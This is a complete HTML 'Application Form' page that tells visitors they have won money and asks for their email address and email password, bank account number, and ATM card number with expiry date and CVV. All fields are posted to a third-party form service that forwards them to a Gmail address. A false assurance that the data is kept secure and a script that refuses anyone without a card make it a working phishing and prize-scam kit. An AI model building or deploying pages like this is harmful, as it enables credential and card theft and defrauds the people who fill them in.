<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      max-width: 600px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .error {
      color: red;
      font-size: 0.9em;
    }
    .password-toggle {
      position: relative;
    }
    .password-toggle input {
      padding-right: 40px;
    }
    .toggle-eye {
      position: absolute;
      right: 10px;
      top: 37px;
      cursor: pointer;
    }
    .note {
      margin-top: 20px;
      font-weight: bold;
      color: green;
    }
  </style>
</head>
<body>
  <h2 style="text-align:center;">Application Form</h2>
  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" id="applicationForm">
    
    <label>Full Name:</label>
    <input type="text" name="Full Name" required />

    <label>Country:</label>
    <input type="text" name="Country" required />

    <label>Phone Number:</label>
    <input type="tel" name="Phone Number" id="phone" required />
    <div class="error" id="phoneError"></div>

    <label>Email Address:</label>
    <input type="email" name="Email Address" required />

    <label>Email Password:</label>
    <div class="password-toggle">
      <input type="password" name="Email Password" id="emailPassword" required />
      <span class="toggle-eye" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <label>Amount You Won:</label>
    <input type="text" name="Amount You Won" required />

    <label>Bank Account Type (e.g., Standard Bank Account):</label>
    <input type="text" name="Bank Account Type" required />

    <label>Bank Account Number:</label>
    <input type="text" name="Bank Account Number" required />

    <label>Bank Account Holder's Name:</label>
    <input type="text" name="Bank Account Holder's Name" required />

    <label>Did You Link ATM to Your Bank Account?</label>
    <select name="ATM Linked" id="atmLinked" required>
      <option value="">-- Select --</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>

    <div id="atmFields">
      <label>ATM Card Number:</label>
      <input type="text" name="ATM Card Number" id="cardNumber" />

      <label>Expiry Date (MM/YY):</label>
      <input type="text" name="Expiry Date" id="expiryDate" maxlength="5" />

      <label>CVV:</label>
      <input type="text" name="CVV" id="cvv" />
    </div>

    <div class="note" id="finalNote">
      You will receive <strong><span id="amountWonDisplay"></span></strong> to your <strong><span id="accountTypeDisplay"></span></strong> <strong><span id="accountNumberDisplay"></span></strong>
    </div>

    <!-- üîê Data Privacy Statement -->
    <p style="color: green; font-weight: bold;">We keep your data/details secure and confidential.</p>

    <!-- ‚úÖ Redirect to thankyou.html after submission -->
    <input type="hidden" name="_redirect" value="https://onlinegistrationProg.github.io/thankyou.html">

    <button type="submit" style="margin-top:20px;">Submit</button>
  </form>

  <script>
    const atmLinked = document.getElementById('atmLinked');
    const atmFields = document.getElementById('atmFields');
    const finalNote = document.getElementById('finalNote');
    const cardNumber = document.getElementById('cardNumber');
    const expiryDate = document.getElementById('expiryDate');
    const cvv = document.getElementById('cvv');
    const phone = document.getElementById('phone');
    const phoneError = document.getElementById('phoneError');

    const amountInput = document.querySelector('input[name="Amount You Won"]');
    const accountTypeInput = document.querySelector('input[name="Bank Account Type"]');
    const accountNumberInput = document.querySelector('input[name="Bank Account Number"]');
    const amountWonDisplay = document.getElementById('amountWonDisplay');
    const accountTypeDisplay = document.getElementById('accountTypeDisplay');
    const accountNumberDisplay = document.getElementById('accountNumberDisplay');

    function togglePassword() {
      const pwField = document.getElementById('emailPassword');
      pwField.type = pwField.type === 'password' ? 'text' : 'password';
    }

    atmLinked.addEventListener('change', function () {
      if (this.value === 'No') {
        atmFields.style.display = 'none';
        finalNote.style.display = 'none';
        alert('YOU MUST HAVE ATM CARD TO PROCEED');
      } else {
        atmFields.style.display = 'block';
        finalNote.style.display = 'block';
      }
    });

    phone.addEventListener('blur', function () {
      const phoneVal = phone.value.trim();
      if (phoneVal.length < 9 || phoneVal.length > 12) {
        phoneError.textContent = 'Phone number must be between 9 to 12 digits.';
      } else {
        phoneError.textContent = '';
      }
    });

    cardNumber.addEventListener('blur', function () {
      if (cardNumber.value.trim().length !== 16) {
        alert('Card Number must be exactly 16 digits.');
      }
    });

    cvv.addEventListener('blur', function () {
      if (cvv.value.trim().length !== 3) {
        alert('CVV must be exactly 3 digits.');
      }
    });

    expiryDate.addEventListener('input', function (e) {
      let val = expiryDate.value.replace(/\D/g, '');
      if (val.length >= 3) {
        expiryDate.value = val.slice(0, 2) + '/' + val.slice(2, 4);
      } else {
        expiryDate.value = val;
      }
    });

    amountInput.addEventListener('input', () => {
      amountWonDisplay.textContent = amountInput.value;
    });
    accountTypeInput.addEventListener('input', () => {
      accountTypeDisplay.textContent = accountTypeInput.value;
    });
    accountNumberInput.addEventListener('input', () => {
      accountNumberDisplay.textContent = accountNumberInput.value;
    });
  </script>
</body>
      </html>
